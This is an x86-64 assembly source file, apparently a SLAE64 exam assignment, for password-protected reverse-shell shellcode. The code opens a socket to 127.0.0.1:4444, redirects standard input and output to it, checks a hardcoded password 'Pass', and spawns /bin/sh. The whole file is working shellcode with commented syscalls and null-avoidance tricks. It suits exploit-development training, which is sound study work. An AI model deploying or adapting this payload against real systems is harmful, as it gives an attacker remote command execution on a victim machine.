;Exam Assignment 2
;RevShell 4444  with password connect to a listener  ;
;Default password = Pass                        ;
;If connected the shellcode no prompt for password   ;
;Enter password directly and you get the bin/sh shell;
;if password is wrong the shellcode exit:            ;
;Christophe G SLAE64 - 1337                 ;



global _start

section .text

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41


	push byte 0x29      ; syscall 41
	pop rax
	push byte 0x2       ; AF_INET
	pop rdi
	push byte 0x1       ; SOCK_STREAM
	pop rsi
	xor rdx, rdx        ;  0
	syscall

	; copy socket descriptor to rdi for future use

	xchg rdi, rax


	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)  ; port 4444
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rax , rax
	push rax                         ; bzero(&server.sin_zero, 8)
	mov ebx , 0xfeffff80             ; ip address 127.0.0.1 "noted"
	not ebx
	mov dword [rsp-4], ebx
	sub rsp , 4                      ; adjust the stack
	push word 0x5c11                 ; port 4444 in network byte order
	push word 0x02                   ; AF_INET



	; connect(sock, (struct sockaddr *)&server, sockaddr_len)

	push byte 0x2a ; connect syscall
	pop rax
        push rsp ; 	eq ->mov rsi, rsp
        pop rsi
        push byte 0x10 ; sockaddr_len
	pop rdx
	syscall


        ; duplicate sockets

        ; dup2 (new, old)
        xor rsi , rsi

dup2:

   push byte 0x21 ; dup2 syscall
   pop rax
   syscall
   inc rsi
   cmp rsi , 0x3  ; if rsi == 3 shellcode go further
   loopne dup2



	xor rax , rax
        push 0x8
        pop rdx                ; size of user input (more than needed)
        sub rsp , 0x8          ; 8 bytes to receive user input (greater than needed dont't affect shellcode size and behavior)
        push rsp
        pop rsi
        xor rdi , rdi
        syscall         		; system read function call
        push 0x73736150  		; "Pass" in reverse order (small 4 bytes password to reduce size of shellcode)
        pop rax ;
        lea rdi , [rel rsi]     ; relative adressing decrease risk of nulls ; needed for scasd
        scasd
        jz Execve               ; if pass correct jmp to Execve , else simply exit
        push 0x3c
        pop rax
        syscall                 ; exit syscall (60)



    Execve:


         xor rsi , rsi                     ; set RSI                 ; execve format , execve ("/bin/sh" , 0 , 0)
         mul rsi                           ; set RDX , RAX
         push ax                           ; null push terminate string
         mov rbx , 0x68732f2f6e69622f      ; push /bin//sh in reverse
         push rbx
         push rsp
         pop rdi                           ; set RDI
         push byte 0x3b                    ; syscall number 59
         pop rax
         syscall                           ; syscall



